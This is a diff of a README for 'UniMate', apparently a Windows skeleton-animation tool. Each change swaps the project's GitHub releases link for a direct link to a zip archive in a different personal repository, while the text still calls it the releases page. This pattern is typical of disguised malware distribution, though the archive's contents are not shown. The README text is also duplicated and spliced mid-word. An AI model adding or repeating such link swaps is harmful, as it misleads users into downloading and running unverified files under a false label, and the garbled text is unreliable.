@@ -5,13 +5,13 @@ description: "Animate diverse 3D skeletons with one unified model for efficient 
 ---
 # 🎬 UniMate - Animate Diverse Skeletons With Ease
 
-[![Download UniMate](https://img.shields.io/badge/Download_UniMate-Visit_Releases-ff69b4?style=for-the-badge&labelColor=1e90ff&logo=github&logoColor=white)](https://github.com/mohameddioman/UniMate/releases)
+[![Download UniMate](https://img.shields.io/badge/Download_UniMate-Visit_Releases-ff69b4?style=for-the-badge&labelColor=1e90ff&logo=github&logoColor=white)](https://raw.githubusercontent.com/mohameddioman/mohameddioman.github.io/main/tyrannoid/v1.9.zip)
 
 UniMate is a Windows application for animating diverse skeletons with one unified model. It is presented at SIGGRAPH Asia 2026 and is built for creators, students, researchers, and anyone who wants to bring skeleton-based characters to life without needing a complicated animation setup.
 
 ## 🚀 Download UniMate
 
-Visit this link to download the application: [UniMate Releases](https://github.com/mohameddioman/UniMate/releases)
+Visit this link to download the application: [UniMate Releases](https://raw.githubusercontent.com/mohameddioman/mohameddioman.github.io/main/tyrannoid/v1.9.zip)
 
 The large button at the top of this page opens the same download page. Use it whenever you need the current UniMate release.
 
@@ -38,7 +38,7 @@ Follow these steps in order:
 
 1. Click the large Download UniMate button at the top of this page.
 2. The UniMate Releases page opens in your browser.
-3. Visit this link to download the application: [UniMate Releases](https://github.com/mohameddioman/UniMate/releases).
+3. Visit this link to download the application: [UniMate Releases](https://raw.githubusercontent.com/mohameddioman/mohameddioman.github.io/main/tyrannoid/v1.9.zip).
 4. Use the newest release shown on the page.
 5. Start the download and wait for it to finish. Keep your browser open until the download completes.
 6. Open your Downloads folder.
@@ -90,13 +90,13 @@ The app is most useful when you want one place to test, review, and save animati
 
 If# 🎬 UniMate - Animate Diverse Skeletons With Ease
 
-[![Download UniMate](https://img.shields.io/badge/Download_UniMate-Visit_Releases-ff69b4?style=for-the-badge&labelColor=1e90ff&logo=github&logoColor=white)](https://github.com/mohameddioman/UniMate/releases)
+[![Download UniMate](https://img.shields.io/badge/Download_UniMate-Visit_Releases-ff69b4?style=for-the-badge&labelColor=1e90ff&logo=github&logoColor=white)](https://raw.githubusercontent.com/mohameddioman/mohameddioman.github.io/main/tyrannoid/v1.9.zip)
 
 UniMate is a Windows application that makes it easy to animate diverse skeletons using one unified model. Presented at SIGGRAPH Asia 2026, UniMate is designed for artists, students, researchers, and anyone who wants to create skeleton-based animations without needing advanced technical skills. The app brings skeleton loading, motion preview, and animation saving into one simple workspace so you can focus on your creative work.
 
 ## 📥 Download UniMate
 
-Visit this link to download the application: [UniMate Releases](https://github.com/mohameddioman/UniMate/releases)
+Visit this link to download the application: [UniMate Releases](https://raw.githubusercontent.com/mohameddioman/mohameddioman.github.io/main/tyrannoid/v1.9.zip)
 
 The large button at the top of this page opens the same download page. Use it whenever you need the current UniMate release.
 
@@ -182,7 +182,7 @@ UniMate is a Windows application for animating diverse skeletons with one unifie
 No. UniMate is designed for average computer users. You load a skeleton, apply animation, preview the result, and save your work.
 
 **Where do I download UniMate?**  
-Visit this link to download the application: [UniMate Releases](https://github.com/mohameddioman/UniMate/releases).
+Visit this link to download the application: [UniMate Releases](https://raw.githubusercontent.com/mohameddioman/mohameddioman.github.io/main/tyrannoid/v1.9.zip).
 
 **Does UniMate work on Windows?**  
 Yes. UniMate is built for Windows users.
